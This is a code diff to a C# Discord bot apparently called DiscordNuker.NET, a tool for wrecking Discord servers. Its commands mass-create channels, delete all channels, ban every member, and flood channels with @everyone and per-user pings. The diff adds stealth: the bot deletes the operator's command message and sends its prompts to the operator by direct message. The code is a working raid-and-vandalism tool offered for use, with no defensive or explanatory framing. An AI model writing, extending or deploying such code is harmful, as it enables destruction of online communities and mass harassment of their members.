@@ -1,4 +1,5 @@
-﻿using Discord.Commands;
+﻿using Discord;
+using Discord.Commands;
 using System;
 using System.IO;
 using System.Threading.Tasks;
@@ -11,16 +12,16 @@ namespace DiscordNuker.NET.Commands
 
         public async Task CreateChannels()
         {
-
-            await ReplyAsync("Check console.");
+            var dm = Context.Message.Author;
+            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
+            await Context.Message.DeleteAsync();
             Console.WriteLine("[-] Number of channels to make?");
+
             string input = Console.ReadLine();
             int num = Convert.ToInt32(input);
-            await Task.Delay(500);
 
             Console.WriteLine("[-] Name of channels? (seperate with -)");
             string channame = Console.ReadLine();
-
             for (int i = 0; i < num; i++)
             {
                 await Context.Guild.CreateTextChannelAsync(channame);
@@ -32,7 +33,8 @@ namespace DiscordNuker.NET.Commands
 
         public async Task DelChannels()
         {
-            await ReplyAsync("Alright!");
+            var okay = new Emoji("👍");
+            await Context.Message.AddReactionAsync(okay);
 
             foreach (var chan in await Context.Guild.GetChannelsAsync())
             {
@@ -53,7 +55,9 @@ namespace DiscordNuker.NET.Commands
 
         public async Task CreateCategories()
         {
-            await ReplyAsync("Check console.");
+            var dm = Context.Message.Author;
+            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
+            await Context.Message.DeleteAsync();
             Console.WriteLine("[-] Number of categories to make?");
             string input = Console.ReadLine();
             int num = Convert.ToInt32(input);
@@ -74,7 +78,9 @@ namespace DiscordNuker.NET.Commands
         public async Task CreateVC()
         {
 
-            await ReplyAsync("Check console.");
+            var dm = Context.Message.Author;
+            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
+            await Context.Message.DeleteAsync();
             Console.WriteLine("[-] Number of voice channels to make?");
             string input = Console.ReadLine();
             int num = Convert.ToInt32(input);
@@ -94,9 +100,8 @@ namespace DiscordNuker.NET.Commands
 
         public async Task BanAll()
         {
-
-            await ReplyAsync("Oki doki!");
-
+            var okay = new Emoji("👍");
+            await Context.Message.AddReactionAsync(okay);
             await Context.Guild.DownloadUsersAsync();
             foreach (var user in await Context.Guild.GetUsersAsync())
             {
@@ -118,8 +123,10 @@ namespace DiscordNuker.NET.Commands
 
         public async Task PingAll()
         {
-            await ReplyAsync("Check console.");
-            Console.WriteLine("[-] Message to say after mention?");
+            var dm = Context.Message.Author;
+            await UserExtensions.SendMessageAsync(dm, "Check console.");
+            await Context.Message.DeleteAsync();
+            Console.WriteLine("[-] Message to say after the ping?");
             var msg = Console.ReadLine();
 
             foreach (var mem in await Context.Guild.GetUsersAsync())
@@ -132,11 +139,12 @@ namespace DiscordNuker.NET.Commands
 
         public async Task MentionAll()
         {
-            await ReplyAsync("Check console.");
-
+            var dm = Context.Message.Author;
+            await UserExtensions.SendMessageAsync(dm, "Check console.");
+            await Context.Message.DeleteAsync();
             Console.WriteLine("[-] Message to send after @everyone?");
             var msg = Console.ReadLine();
-            Console.WriteLine("[-] How many times should this be repeated");
+            Console.WriteLine("[-] How many messages to send in each channel?");
             var repeat = Console.ReadLine();
             int num = Convert.ToInt32(repeat);
             for (int i = 0; i < num; i++)
@@ -156,5 +164,6 @@ namespace DiscordNuker.NET.Commands
                 }
             }
         }
+
     }
 }
